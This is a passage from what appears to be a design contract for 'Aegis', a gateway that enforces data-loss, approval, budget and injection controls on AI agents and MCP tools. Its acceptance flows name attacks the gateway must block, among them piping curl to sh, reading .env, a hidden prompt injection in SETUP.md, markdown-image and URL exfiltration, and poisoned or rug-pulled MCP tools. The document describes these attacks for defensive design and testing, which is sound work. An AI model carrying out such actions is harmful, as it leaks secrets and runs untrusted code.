  summary_json TEXT NOT NULL, detail_json TEXT);
CREATE INDEX IF NOT EXISTS ix_decisions_ts      ON decisions(ts);
CREATE INDEX IF NOT EXISTS ix_decisions_action  ON decisions(action, ts);
CREATE INDEX IF NOT EXISTS ix_decisions_control ON decisions(control_id, ts);
CREATE INDEX IF NOT EXISTS ix_decisions_agent   ON decisions(agent_id, ts);

-- threat-feed
CREATE TABLE IF NOT EXISTS feed_state (feed_id TEXT PRIMARY KEY, serial INTEGER, version TEXT, sha256 TEXT, applied_at TEXT, status TEXT,
  last_error TEXT, history_json TEXT NOT NULL DEFAULT '[]');
CREATE TABLE IF NOT EXISTS signature_hits (ts TEXT NOT NULL, signature_id TEXT NOT NULL, surface TEXT, action TEXT, decision_id TEXT);

-- mcp-proxy
CREATE TABLE IF NOT EXISTS mcp_tools (server TEXT NOT NULL, tool TEXT NOT NULL, hash TEXT NOT NULL, definition_json TEXT NOT NULL,
  status TEXT NOT NULL, reasons_json TEXT NOT NULL DEFAULT '[]', first_seen TEXT NOT NULL, last_seen TEXT NOT NULL, approved_by TEXT,
  PRIMARY KEY (server, tool));

-- core-gateway
CREATE TABLE IF NOT EXISTS sessions (id TEXT PRIMARY KEY, org_id TEXT, agent_id TEXT, member_id TEXT, source TEXT, started_at TEXT NOT NULL,
  last_seen TEXT NOT NULL, requests INTEGER NOT NULL DEFAULT 0);
```

### 6.2 Data directory (`AEGIS_DATA_DIR`, default `./data`, created on start)

```
data/
├── aegis.db                         SQLite (WAL) — §6.1
├── audit/audit-YYYYMMDD.jsonl       hash-chained audit records (one JSON object per line)   [audit-metrics]
├── audit/HEAD.json                  {"seq", "hash", "file"}                                 [audit-metrics]
├── policy/last_good.yaml            last successfully applied YAML                          [policy-engine]
├── feed/latest.json, feed/bundle-NNNNNN.json(.sig)   verified cache (last 5)                [threat-feed]
├── keys/hmac.key                    persistent HMAC key if AEGIS_HMAC_KEY unset             [core-gateway]
└── mocks/                           mock request logs, acme_db.sqlite, state                [demo-mocks-docs, mcp-proxy]
```

**Audit chain:** `hash = sha256(prev_hash + canonical_json(event_without_hash_fields))`, `canonical_json = json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False, default=str)` over `model_dump(mode="json", by_alias=True, exclude={"hash"})`; genesis `prev_hash = "0" * 64`. Exports: `jsonl` (raw lines), `csv` (flattened summary columns), `ocsf` (Detection Finding 2004 for non-allow decisions, API Activity 6003 otherwise). Content is never stored raw (`defaults.audit_content: false`).

### 6.3 SSE (`GET /api/events`)

Wire format: `id: <bus id>\nevent: <name>\ndata: <json>\n\n`. Payload types are `SseEventMap` in §5.5. Publisher = whoever causes the event.

| Event | Publisher | When |
|---|---|---|
| `decision` | core-gateway (pipeline) | every non-dry-run evaluation |
| `approval.created`, `approval.updated` | approvals-engine | create / vote / decide / expire / execute |
| `budget.updated` | budgets-ledger | after settle (throttled ≤ 2/s) |
| `budget.threshold` | budgets-ledger | crossing 50 / 80 / 100 % |
| `policy.applied`, `policy.rejected` | policy-engine | after swap / on rejection |
| `feed.updated`, `feed.rejected` | threat-feed | after swap / on rejection |
| `killswitch` | budgets-ledger | kill switch state change observed after policy swap |
| `mcp.tool` | mcp-proxy | tool quarantined / changed / approved |
| `org.updated` | org-rbac | member/agent changed |
| `stats` | audit-metrics | every 2 s |
| `system` | anyone | degraded/recovered components, model loaded, warnings (toast) |
| `heartbeat` | core-gateway | every 15 s |

### 6.4 Metrics (`GET /metrics`, prefix `aegis_`; never use session/request ids as labels)

`aegis_requests_total{surface,source,action}` · `aegis_decisions_total{control_id,action,mode}` · `aegis_control_duration_seconds{control_id,kind}` (histogram) · `aegis_gateway_overhead_seconds{phase}` (histogram, buckets `[.0002,.0005,.001,.0025,.005,.01,.025,.05,.1,.25,.5,1]`) · `aegis_upstream_duration_seconds{provider}` · `aegis_tokens_total{provider,model,type}` · `aegis_cost_usd_total{team,agent,provider}` · `aegis_cost_avoided_usd_total{reason}` · `aegis_redactions_total{entity,dest_class}` · `aegis_budget_utilization_ratio{scope_type,scope,dimension}` · `aegis_approvals_total{kind,outcome}` · `aegis_approvals_pending` · `aegis_signature_hits_total{signature_id}` · `aegis_loop_detections_total{detector}` · `aegis_killswitch_active` · `aegis_policy_version` · `aegis_policy_reloads_total{result}` · `aegis_feed_serial` · `aegis_feed_reloads_total{result}` · `aegis_semantic_degraded`.

### 6.5 Environment variables (read only via `aegis.settings.Settings`; `.env.example` lists them)

| Var | Default | Used by |
|---|---|---|
| `AEGIS_HOST` / `AEGIS_PORT` | `127.0.0.1` / `8787` | gateway (`0` = ephemeral, tests) |
| `AEGIS_POLICY` | `config/policy.yaml` | policy-engine |
| `AEGIS_ORG_SEED` | `config/org.seed.yaml` | org-rbac |
| `AEGIS_PRICING` | `config/pricing.yaml` | budgets-ledger |
| `AEGIS_DATA_DIR` | `data` | all storage |
| `AEGIS_MODELS_DIR` | `models` (repo root, already populated) | semantic-models, redaction-engine (read) |
| `AEGIS_HMAC_KEY` | unset → generated once into `data/keys/hmac.key` | core-gateway (`aegis.core.crypto`) |
| `AEGIS_FEED_URL` | `http://127.0.0.1:8790` (`disabled` = seed bundle only) | threat-feed |
| `AEGIS_FEED_PUBKEY` | `config/feeds/feed_pubkey.b64` | threat-feed |
| `AEGIS_OLLAMA_URL` | `http://127.0.0.1:11434` | semantic-models, providers default |
| `AEGIS_SEMANTIC` | `auto` (`on`/`off`; `off` = heuristic only, used by unit tests) | semantic-models |
| `AEGIS_DEMO_MODE` | `1` (header identity + view-as allowed) | org-rbac |
| `AEGIS_DEFAULT_VIEWER` | first owner in seed (`u_katarzyna`) | org-rbac |
| `AEGIS_ADMIN_TOKEN` | unset (if set, mutating `/api/*` require `Authorization: Bearer <token>` **in addition** to view-as RBAC) | core-gateway |
| `AEGIS_UI_DIST` | `web/dist` | core-gateway |
| `AEGIS_HOST_MAP` | §5.6 | metadata-egress |
| `AEGIS_VAULT_SECRET` | random per process | redaction-engine |
| `AEGIS_LOG_LEVEL` / `AEGIS_LOG_JSON` / `AEGIS_ACCESS_LOG` | `INFO` / `0` / `0` | core-gateway |
| `AEGIS_TEST_MODE` | `0` (`1` = no watchers/pollers/background loops) | all services with background tasks |
| `AEGIS_LIVE_URL` | unset | test-suite live mode |
| `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `OPENROUTER_API_KEY`, `GEMINI_API_KEY` | unset | providers (`enabled_if_env`) |
| Hook client: `AEGIS_URL`, `AEGIS_AGENT`, `AEGIS_AGENT_KEY`, `AEGIS_HOOK_TIMEOUT` | `http://127.0.0.1:8787`, `claude-code@platform`, seed key, `110` | `scripts/aegis-hook` |
| Frontend: `VITE_AEGIS_API` / `VITE_AEGIS_MOCK` | `` (same origin) / `0` | dashboard |

### 6.6 Ports

| Port | Process |
|---|---|
| 8787 | gateway: data plane + `/api` + `/ui` + `/metrics` |
| 8790 | threat-intel feed service |
| 8791 | mock_llm · 8792 mock_mcp · 8793 exfil_sink · 8794 mock_saas · 8795 reserved (A2A) · 8796–8799 reserved |
| 11434 | Ollama (local models; Aegis exposes it via `/ollama/*`) |
| 5173 | Vite dev server (proxies `/api`, `/v1`, `/healthz`, `/metrics` → 8787; base `/ui/`) |

---

## 7. Rules for parallel work

### 7.1 Ground rules (violations break other agents)

1. **Edit only paths you own** (§1.2). Never create, move, format or delete files outside them. Need something elsewhere → "Requests" in your report.
2. **Never edit frozen files or manifests** (`types.py`, `protocols.py`, `policy_schema.py`, `web/src/api/types.ts`, `web/src/lib/page.ts`, `pyproject.toml`, `uv.lock`, `web/package*.json`, `vite.config.ts`, `tsconfig*`, `Makefile`, `CONTRACTS.md`). Escape hatches: `Interaction.meta/labels`, `Decision.meta`, `Finding.meta`, `ControlConfig.params`, `AuditEvent.data`, section `extra` keys, page-local TS types.
3. **No git commands. No dependency installs** (`uv add`, `pip install`, `npm install <pkg>`). Use only deps in §7.6. If you need another, write it under "Deps requested" and guard the import (`try/except ImportError` → degrade).
4. **Interfaces first.** Your first step creates your public modules (§3.3 tables, your route files, your `create()` factory, your `CONTROLS`) with the exact names/signatures and safe stub behaviour, so others can import immediately. Then fill in.
5. **Cross-workstream access only via** frozen modules, `rt.<service>`, and the public import surfaces in §3.3. Never import another workstream's private modules, never read/write another owner's SQLite tables directly (use their API or service).
6. **Fail soft.** No import-time side effects; services start even when optional deps/models/Ollama are missing (`degraded`, never crash). Wrap optional features. The gateway must boot with only frozen files + core-gateway.
7. **Never block the event loop**: CPU-heavy work (ONNX, Presidio, regex over big inputs, SQLite bulk) via `asyncio.to_thread`; network via `httpx.AsyncClient`.
8. **Privacy by construction**: never log or persist raw prompt/response/tool-arg text, secrets, `Authorization`, cookies or vault values. Excerpts/previews only via `rt.redactor.mask_for_log()`. `Finding.excerpt`, `Finding.replacement`, `ApprovalRequest.payload` and SSE payloads never contain raw sensitive values (they are audited and broadcast).
9. **Shared machine (8 GB RAM):** do **not** bind fixed ports (8787, 8790–8799, 5173) during development or tests — use in-process ASGI (`httpx.ASGITransport` + `asgi_lifespan.LifespanManager`) or `port=0`. Start at most one server process at a time, kill what you start, never kill processes you did not start. Model weights already exist in `models/` and as Ollama tags `aegis-guard` / `aegis-judge`; only **semantic-models** may download or create more. Everyone else develops with `AEGIS_SEMANTIC=off`; tests that load a model (ONNX or Ollama) are marked `semantic`. Never `ollama pull` large models.
10. **Frontend:** do not run `npm install`/`npm ci` (scaffold did) or `npm run build` (dashboard-shell only, at the end). Verify with `cd web && npm run typecheck` and `npm run lint`. Don't start Vite on 5173; if you must, `npx vite --port 0` and stop it.
11. **Determinism for tests:** honour `AEGIS_TEST_MODE=1` (no pollers/watchers/timers) and `AEGIS_SEMANTIC=off`.
12. **IDs, names and paths in this file are binding.** If reality forces a deviation, keep the contract name as an alias and report it.

### 7.2 How to run things (repo root = `aegis/`)

| Task | Command |
|---|---|
| Python env (scaffold already ran `uv sync`) | `uv run --frozen <cmd>` (never `uv add/lock`) |
| Gateway | `uv run --frozen python -m aegis serve [--port 0] [--reload]` |
| Other CLI | `python -m aegis selftest` (policy self-test) · `reset` (wipe `data/`, copy golden policy, reseed org) · `verify-audit` · `seed` |
| Feed service / mocks | `uv run --frozen python -m feed_service [--port N]` · `python -m mocks.mock_llm` · `mocks.mock_mcp` · `mocks.exfil_sink` · `mocks.mock_saas` |
| Whole stack | `uv run --frozen python scripts/run_stack.py` (= `make up`) |
| Your unit tests | `uv run --frozen pytest tests/unit/<ws_snake> -q` |
| Lint your files | `uv run --frozen ruff check <your paths>` · `uv run --frozen ruff format <your paths>` (never the whole repo) |
| Import smoke | `uv run --frozen python -c "import aegis.<your module>"` |
| Frontend | `cd web && npm run typecheck` · `npm run lint` · `npm run dev` (integration only) · `npm run build` (dashboard-shell) |

`python -m aegis` subcommands are dispatched by core-gateway to: `aegis.policy.selftest:main` (policy-engine), `aegis.audit.verify:main` (audit-metrics), `aegis.org.seed:main` (org-rbac); missing targets print a friendly error.

### 7.3 Tests layout and conventions

- **Unit tests** (each workstream): `tests/unit/<ws_snake>/test_*.py`. Fast (< 10 s per workstream), no network except in-process ASGI, no models, no fixed ports. May add `tests/unit/<ws_snake>/conftest.py`.
- **Root fixtures** (test-suite owns `tests/conftest.py`; names are binding, so unit tests may use them; if absent, define locally): `aegis_env` (temp `AEGIS_DATA_DIR`, temp copy of `policy.golden.yaml` as `AEGIS_POLICY`, `AEGIS_SEMANTIC=off`, `AEGIS_FEED_URL=disabled`, `AEGIS_TEST_MODE=1`), `app` (`create_app()` under lifespan), `client` (`httpx.AsyncClient`, base `http://aegis.test`), `rt` (started Runtime), `mock_llm_url` (mock_llm on an ephemeral port in a thread), `policy_patch(fn)` (edit the temp policy and wait for the new version).
- **pytest config** (in `pyproject.toml`): `testpaths=["tests"]`, `pythonpath=[".", "src"]`, `addopts="--import-mode=importlib -q"`, `asyncio_mode="auto"`; markers `unit`, `e2e`, `semantic` (needs models; skipped with reason if unavailable), `live` (needs `AEGIS_LIVE_URL`), `slow`, `bench`.
- **Black-box suite** (test-suite): `tests/cases/*.yaml` (one file per control family; case schema = research 05 §2.4: `id, control, polarity, expect, surface, mode, dest_zone, input, assert{upstream_must_not_contain, response_must_contain, audit_must_not_contain}, tags`), runners in `tests/e2e/`, matrix/report writer in `tests/lib/` (`reports/junit.xml`, `results.json`, `matrix.md`, `selftest.html`). Every control in the catalog needs ≥ 1 must-block and ≥ 1 must-allow case; `tests/test_coverage.py` prints UNTESTED otherwise.
- **Eval/bench/redteam** (redteam-eval-perf): non-gating; writes `reports/eval.json`, `reports/bench.json` (read by `/api/perf`).
- Use only fake/test data (§ research 05 fixture table). Generate secret-shaped strings at runtime, don't commit them.

### 7.4 Logging conventions

- `log = logging.getLogger(__name__)` (all loggers under `aegis.*`); `aegis.log.setup_logging()` (core-gateway) configures handlers once at startup. No `print()` in library code.
- Format: `%(asctime)s %(levelname)-5s %(name)s | %(message)s`; JSON lines when `AEGIS_LOG_JSON=1`.
- Message style: lowercase event first, then `key=value` pairs: `log.info("policy applied version=%s source=%s ms=%.1f", v, src, ms)`.
- Levels: DEBUG per-request detail; INFO lifecycle and config/feed changes; WARNING degraded/fallback; ERROR failures (`log.exception` inside `except`).
- Never log raw content, secrets, auth headers or vault values (rule 7.1-8). uvicorn access log off unless `AEGIS_ACCESS_LOG=1`.

### 7.5 Code style

Python 3.13, full type hints, pydantic v2, async FastAPI, `ruff` (line length 100). Small modules, docstrings on public functions. TypeScript strict, function components, Tailwind utility classes, no default-exported helpers except pages. Path alias `@` → `web/src`.

### 7.6 Dependencies available (scaffold puts them in the manifests)

Python runtime: `fastapi`, `uvicorn[standard]`, `httpx`, `pydantic>=2.9`, `sse-starlette`, `watchfiles`, `pyyaml`, `ruamel.yaml`, `google-re2`, `presidio-analyzer`, `presidio-anonymizer`, `spacy` + `en_core_web_sm` (direct URL wheel; optional leg — code must work without them; **no `pl_core_news_*`**, GPL-3.0), `onnxruntime`, `tokenizers`, `numpy`, `prometheus-client`, `pynacl`, `mcp` (official SDK), `orjson`, `rapidfuzz`, `jsonschema`, `rich`, `psutil`, `python-multipart`.
Python dev: `pytest`, `pytest-asyncio`, `pytest-xdist`, `asgi-lifespan`, `respx`, `ruff`.
Web: `react@19`, `react-dom@19`, `react-router-dom@7`, `tailwindcss@4` + `@tailwindcss/vite`, `tw-animate-css`, `class-variance-authority`, `clsx`, `tailwind-merge`, `lucide-react`, `recharts`, `monaco-editor`, `@monaco-editor/react`, `framer-motion`, `sonner`, `cmdk`, `date-fns`, `@radix-ui/*` (as needed by shadcn primitives), `@fontsource-variable/inter`, `@fontsource-variable/jetbrains-mono`; dev: `vite`, `@vitejs/plugin-react`, `typescript`, `@types/react`, `@types/react-dom`, `@types/node`, `eslint`.
Not allowed: `torch`, `transformers`, `litellm`, `langchain`, Docker anything.
`web/package.json` scripts (scaffold): `dev`, `build` (`tsc -b && vite build`), `typecheck` (`tsc -b --noEmit`), `lint`, `preview`. Path alias `@/*` → `web/src/*` in both `tsconfig` and `vite.config.ts`; Vite `base: "/ui/"`, dev proxy per §6.6.

### 7.7 Makefile targets (scaffold writes; commands call owners' entrypoints)

`setup` (uv sync + npm ci) · `models` (`scripts/fetch_models.sh`) · `feed-keys` · `up` (`scripts/run_stack.py`) · `run` (gateway) · `dev` (gateway --reload + vite) · `web` (npm run build) · `test` (unit + e2e deterministic + matrix) · `test-unit` · `test-e2e` · `test-sem` · `test-live` · `selftest` · `eval` · `bench` · `redteam` · `demo-preflight` · `reset` · `claude` (`cd demo/claude/project && claude --settings ../settings.json --mcp-config ../mcp.json`).

### 7.8 Planner output (`docs/plan/<workstream>.md`)

Sections: Goal & demo value · Files (exact paths, all inside your ownership) · Public interfaces (copied from this contract) · Tasks (T1… each ≤ ~45 min, ordered, with acceptance criteria) · Verification tasks (V1… commands + expected output) · Dependencies on other workstreams (what you consume, how you degrade if missing) · Snippet for `config/snippets/<ws>.yaml` · Risks & cut lines (what to drop first).

### 7.9 Implementer report (final message)

1. Files created/changed (all within ownership). 2. What works (commands to verify). 3. Stubs/gaps left. 4. **Deps requested** (package, version, why). 5. **Requests** to other owners (owner, path, exact change). 6. Contract deviations (should be none; else alias + reason). 7. Snippet path for policy entries.

---

## 8. Headline flows (acceptance; these must work live)

| # | Flow | Path through the system | Workstreams |
|---|---|---|---|
| F1 | **Local data minimization** | Playground / Claude Code prompt with PESEL, IBAN, card, email → `model.request` → DLP-01 tokenizes (`[PESEL_1]`…) → mock/remote model sees placeholders (mock_llm `/_mock/requests`) → response rehydrated locally → live feed `redact` with entities; decision drawer shows original vs outbound. CVV is dropped irreversibly. Same prompt to the local model (`aegis-judge`) → PESEL allowed, PAN tokenized per matrix. DLP-03 strips `metadata.user_id`, paths, hostnames. | core-gateway, redaction-engine, metadata-egress, audit-metrics, dashboard-security, demo-mocks-docs |
| F2 | **Secrets & exfil** | AWS key in prompt → DLP-02 block; `[[EMIT_MD_EXFIL]]` response → DLP-06 strips image; base64 key in `/egress` URL → DLP-04 block; `exfil_sink` hit count stays 0 | redaction-engine, metadata-egress, demo-mocks-docs |
| F3 | **Claude Code governed** | `make claude` → hooks: `curl … \| sh` denied (EXE-01), `Read .env` denied (EXE-02), SETUP.md hidden injection flagged on `tool.output` (INJ-01/02), model traffic via `ANTHROPIC_BASE_URL`; gateway down → hook fails closed | claude-code-integration, action-guards, injection-defense, core-gateway |
| F4 | **Agent action approvals by role** | `trading-copilot@trading` (sponsor u_piotr) calls `marketpulse.purchase_subscription(plan=mp-pro-monthly, amount_usd=50)` → ACT-01 → `spend.subscription` → rule `spend-admin` → MCP proxy / hook holds → toast + Approvals inbox; view as u_piotr → card shows "needs admin" (approve disabled, reason); switch to u_emily (admin) → Approve → the held call proceeds. `$12` dataset by `research-agent@research` → u_agnieszka self-approves; `$480` GPU by `claude-code@platform` → owner (u_katarzyna); `$1500` → owner + two-person; `$5000.01` → blocked. `acme-db.query("SELECT * FROM customers")` → ACT-02 (`sensitivity: CONFIDENTIAL`) → admin; `payment_cards` → denied; `DELETE FROM trades` (env prod) → owner; the query result's PII is redacted before it reaches a remote model | action-guards, approvals-engine, org-rbac, mcp-proxy, dashboard-governance, demo-mocks-docs |
| F5 | **Config governance** | view as u_piotr: raise `team:trading` daily USD 60 → 75 (+25 %) on Budgets page → `propose` → GOV-05 → `raise-team-small` → admin → u_emily approves → executor applies patch → policy v+1 → gauges update live. 60 → 150 (+150 %) → `raise-large` → owner (u_katarzyna). u_marek (admin) disables DLP-02 → needs owner. Owner edits directly → applied immediately. Every step in the audit log | policy-engine, approvals-engine, budgets-ledger, dashboard-governance |
| F6 | **Budgets & runaway agent** | `demo/agents/runaway.py` as `chaos-agent@platform` loops `web.fetch_url`/model calls → EXE-04 loop ladder (tool_error → block) → BUD-01 hits $0.50/day → `on_hard: require_approval` → budget-raise approval → admin approves → continues; at 80 % the copilot is downgraded to `aegis-judge` (local); gauges move live; kill switch on the agent stops it instantly | budgets-ledger, approvals-engine, demo-mocks-docs, dashboard-governance |
| F7 | **Judges edit policy live** | edit `config/policy.yaml` (file or Monaco editor) → applied < 1 s → toast with diff → verdict flips in playground; YAML error → rejected, still on vN with line/col; disabled control → coverage matrix shows `disabled` | policy-engine, dashboard-governance, dashboard-security |
| F8 | **External threat feed** | feed service UI adds/enables a signature → Publish → gateway serial bumps → replayed exploit blocked (`SIG-01`, CVE alias); Tamper → `feed.rejected` red banner, enforcement stays on last good | threat-feed, dashboard-security |
| F9 | **MCP integrity** | poisoned `add` dropped from `tools/list` (MCP-02); rugpull flip → MCP-03 blocks + `mcp_pin` approval → admin re-pins | mcp-proxy, approvals-engine, dashboard-security |
| F10 | **Proof** | `make test` matrix all green (allow + block per control); audit export + verify "chain OK"; perf page p50/p95 overhead; `/metrics` | test-suite, redteam-eval-perf, audit-metrics, dashboard-shell |


---

## Addendum A (Sat night) — resolved contract gaps

> **Status:** v1.1-A · 2026-10-03 (Sat) 23:07 · author: synth-A (contract integrator) on behalf of `scaffold`.
> **Inputs:** every "Contract gaps" / "Requests to other owners" section of the 20 plans `docs/plan/01…20-*.md`.
> **Precedence:** where this addendum conflicts with §1–§8 above, **the addendum wins**. The original text is kept unchanged.
> **Nothing frozen changes.** All additions use the documented escape hatches: `Decision.meta`, `Interaction.meta/labels`, `Finding.meta`, `ControlConfig.params`, `_Section` extra keys, `PolicyTest` extras, `AuditEvent.data`, additive JSON fields, and page-local TS types. The **§1.2 ownership map is unchanged**. New endpoints live in route files their owners already own; the §1.3 path lists are extended below. The only new files outside §1.2 are `docs/seed-fixes/*`, an orchestrator artifact.
> **Format:** each item has an ID, the decision, the owner(s), and exact shapes. `[should]` / `[could]` mark lower priority; everything else is **must**. `Pnn-Gx` = plan `nn`, gap `x`. The gap → decision index is in A.17.
> **Seed fixes:** corrected, config-ready drafts are in `docs/seed-fixes/` (`org.seed.yaml`, `policy.yaml`, `approvals.yaml`). `policy.yaml` validates against the frozen `PolicyDoc`; its `approvals:` block is byte-identical to `approvals.yaml`; all 54 routing tests pass in a first-match simulator. Section A.16 lists each fix and who applies it.

### A.0 The decisions to read first

| # | Decision | Item |
|---|---|---|
| 1 | **Kill switch never answers 403.** On every data-plane surface it answers **429** `killed` with `Retry-After: 3600` and `x-should-retry: false`. A budget stop is **402** `budget_exceeded` with `x-should-retry: false`. A policy block on a model proxy is a **synthetic 200** assistant message. | A-07 |
| 2 | `rt.pipeline.evaluate` sets **`ctx.policy = snap`**. Controls read policy only from `ctx.policy`. | A-01 |
| 3 | Controls add HTTP response headers through **`Decision.meta["response_headers"]`**. `primary.http_status` wins over core's defaults. | A-06 |
| 4 | Usage and cost have **one home**: the request-hop decision, filled by an `outcome` audit record emitted from `pipeline.complete()`. | A-08 |
| 5 | **One NER instance.** semantic-models loads `models/eu-pii-ner` and serves it through `rt.semantic.ner()`. redaction-engine borrows it and never loads its own copy. | A-38 |
| 6 | **Two-person rule = owner + a distinct admin**, plus a proposer co-sign. There is no second owner. | A-20 |
| 7 | There is no `auto_approved` status. Auto-approval is stored as `status="approved"` with `required_role="auto"`. | A-21 |
| 8 | Approval waiting works as follows: the surface holds the call for `hold_s`, the client long-polls `GET /api/approvals/{id}/wait`, then retries with `X-Aegis-Approval: apr_…`. Only **action** approvals are redeemable. | A-23 |
| 9 | The **policy self-test** ignores live counters, kill switches, loops, taint and pins. It rejects only **looser regressions** of must-protect cases. Disabled controls are skipped. | A-29, A-09 |
| 10 | Claude Code identity on the model path uses **`X-Aegis-Agent-Key`** (sent via `ANTHROPIC_CUSTOM_HEADERS`). Claude Code's `Authorization` header stays its OAuth token. | A-17 |
| 11 | Model responses: **`tool_use` inputs are never rehydrated**. Placeholders are restored only for **local** tools: hook `updatedInput`, and `mcp.call` to `local` servers. | A-40 |
| 12 | New control **GOV-06** "Agent harness integrity". Owner: claude-code-integration, in `src/aegis/integrations/claude_code/`. Core discovery also scans `aegis.integrations`. | A-48, A-15 |
| 13 | Matrix `CONFIDENTIAL.third_party` = **redact**, and recipient args are exempt from DLP-01. External email therefore reaches ACT-03 approval instead of being blocked. | SF-04 |
| 14 | Metric names are always `aegis_*`. Unknown names are auto-registered, never rejected. | A-50 |

---

### A.1 Core pipeline semantics (owner: core-gateway unless noted)

**A-01 · `ctx.policy` is the evaluated snapshot.** In §3.5 step 1, `snap = policy or ctx.policy or rt.policy.snapshot()`, then **`ctx.policy = snap`** before `enrich`.
- Every control and helper reads `destinations.*`, `actions:`, `models.*`, `budgets.*` and `mcp.*` from `ctx.policy` (`snap.doc`). They never call `rt.policy.snapshot()` inside `enrich`/`evaluate`/`on_complete`.
- `new_context()` still pins the live snapshot at ingress.
- The self-test creates a fresh ctx per case and passes `policy=candidate`, so a candidate that edits `destinations` or `actions` is judged under its own values.
- Guarded fallback `ctx.policy or rt.policy.snapshot()` stays legal.
- Owners: core-gateway (set), all control owners (read). Refs: P04-G2, P10-G1, P10-G8e.

**A-02 · One context per request; decision id known before approvals.**
- The response hop of a model call (`model.response`) and the result hop of an MCP call (`mcp.result`) or egress call (`egress.response`) are evaluated with **the same `RequestContext`** as their request hop, with `interaction.parent_id` = the request interaction id. `ctx.state` is shared, for example `ctx.state["inj.sys_shingles"]`.
- Hook `PostToolUse` is a separate HTTP request with a new ctx. Correlate it via `session_id` + `tool_use_id` (`meta.claude_code.tool_use_id`).
- The verdict id is allocated at step 1. Before `rt.approvals.request()`, the pipeline sets **`decision.meta["decision_id"] = verdict.id`** on the primary decision, and approvals-engine stores it in `ApprovalRequest.decision_id`.
- Refs: P05-#2, P09-#6.

**A-03 · Complete control trace and per-control timings.**
- For every evaluated control that returned `None`/allow, the pipeline appends `Decision(action="allow", control_id=<id>, latency_ms=<measured>, meta={"no_finding": true})` to `verdict.decisions`. These rows appear in `DecisionDetail.decisions` and the playground waterfall. `DecisionSummary.controls` stays **non-allow only** (unchanged).
- Controls that compute a score (INJ-02, INJ-03, DLP-07, CUS-01, MCP-02, DLP-02 entropy) return a `Decision` carrying `score` + `threshold` **even when allowing**, so the trace can say "0.62 < 0.80".
- Core writes `ctx.timings["ctl.<ID>"]` (ms) for every evaluated control, plus `ctx.timings["pipeline"]`. It calls `rt.metrics.observe_overhead("request"|"response", seconds)` per hop, alongside the phase timings (`enrich`, `deterministic`, `semantic`, `approvals`, `transform`, `record`).
- `Server-Timing` lists `aegis;dur=…, ctl;dur=…, upstream;dur=…` plus the slowest 8 controls as `ctl-<ID>;dur=…`.
- `/v1/guard` with `dry_run: true` still returns `verdict.decisions[*].latency_ms` and `Server-Timing`.
- Refs: P16-G1, P19-G-C1, P19-G-C2, P14-G6.

**A-04 · Monitor mode set by the control itself.** A decision returned with `mode="monitor"` (e.g. a SIG-01 `experimental` signature) is treated exactly like a `cfg.mode == "monitor"` decision: it is recorded as "would have …" and never affects the final action. SIG-01 also returns `action="log"` in that case. Ref: P13-#5.

**A-05 · Deterministic timeouts.**
- A control task that **completed** is always used, even if it finished after `cfg.timeout_ms`. Only tasks still running are cancelled and go to `fail_mode`.
- policy-engine never ports the staged 2–20 ms timeouts for deterministic controls; the schema default of 250 ms applies [SF-11].
- Ref: P01-#8.

**A-06 · Control-requested response headers and HTTP status precedence.**
- **`Decision.meta["response_headers"]: dict[str, str]`**. Header names are lower-case. Allowed names are `x-aegis-*`, `retry-after` and `x-should-retry`; any other name is dropped with one WARNING per name.
- Core merges these headers from **all enforce-mode decisions** of the request verdict and, for model calls, the response verdict. On conflict, the primary decision wins, then the lower control `priority`, then `control_id`.
- They are applied to **every data-plane HTTP response**, allowed or blocked: the model proxies, `/egress`, `/v1/guard`, `/mcp/{server}` and `/v1/hooks/claude-code`.
- Core adds `Retry-After: <primary.retry_after_s>` when it is set and the header is not already present.
- **`primary.http_status` overrides** core's default status for the `error_type` (table in A-07).
- BUD-01 publishes `x-aegis-budget-remaining: usd=0.42;scope=team:research`, the tightest remaining budget across the scope chain. **`ctx.state["bud.remaining"]` is not used.**
- Additive outbound header **`X-Aegis-Response-Decision-Id`**: the response-hop verdict id, next to `X-Aegis-Decision-Id` (request hop).
- Hook responses also carry `X-Aegis-Decision-Id`. Hook deny reasons always start with `[Aegis] <CONTROL-ID>: `.
- Refs: P07-G1, P01-#1, P01-#7, P18-E.

**A-07 · Stop codes (all wires; safe for Claude Code; never 403 for the kill switch).** Evidence: `staging/spikes/claude-code/FINDINGS.md`:
- A plain 429 retries 11× over about 175 s.
- 429 + `retry-after: 3600` and/or `x-should-retry: false` gives one attempt and a clean exit.
- 402 gives one attempt and the message "API Error: 402 <msg>".
- 403 shows the misleading "Failed to authenticate".
- A synthetic 200 is shown as the assistant reply.

The same codes apply to every client; core needs no client detection. EXE-04 `params.claude_code_stop` is obsolete (ignored).

| Situation | `error_type` | Model proxies (`/v1/messages`, `/v1/chat/completions`, `/ollama`) | `/egress` | `/mcp/{server}` `tools/call` | Hook | Headers (via A-06) |
|---|---|---|---|---|---|---|
| policy block | `policy_blocked` | **200** synthetic `[Aegis] Blocked by <ID>: <reason> (dec_…, policy vN)` (`block_response: error` → 403 wire error) | 403 | 200, JSON-RPC result `isError` | `deny` | — |
| approval pending | `approval_required` | 200 synthetic with `apr_…` + link (`error` → 403) | 403 + `approval_id`, `required_role`, `expires_at` | `isError` + `_meta` (A-46) | `deny` after the hold | `x-aegis-approval-id` |
| budget hard limit, session step cap | `budget_exceeded` | **402** wire error | 402 | `isError` | `deny` | `x-should-retry: false` |
| rate limit / burn-rate throttle | `rate_limited` | **429** | 429 | `isError` | `deny` | `retry-after: n` (n ≤ 60) |
| loop ladder step 2 (tool calls blocked) | `rate_limited` | 429 | 429 | `isError` | `deny` | `retry-after: <cooldown_s>`, `x-should-retry: false` |
| **kill switch / loop kill** | `killed` | **429** (never 403) | **429** | `isError` | `deny` | `retry-after: 3600`, `x-should-retry: false` |
| GOV-01 bad credential | `unauthenticated` | **401** wire error | 401 | `isError` | `deny` | — |
| GOV-01 disabled principal | `forbidden` | 403 wire error | 403 | `isError` | `deny` | — |

- Loop ladder step 1 (`tool_error`) is a plain policy block: a synthetic 200 on the model path, `isError` on MCP, and a deny reason on hooks.
- Blocked hops complete with `Outcome(status_code=<status actually returned>, usage=Usage(requests=0))`.
- The §5.3 rows "kill switch → 403 killed" are **superseded**.
- Refs: P01-#10, P07-G2, P12-G4a–c, HANDOFF known issue.

**A-08 · Usage and cost attachment (one home, no double counting).**
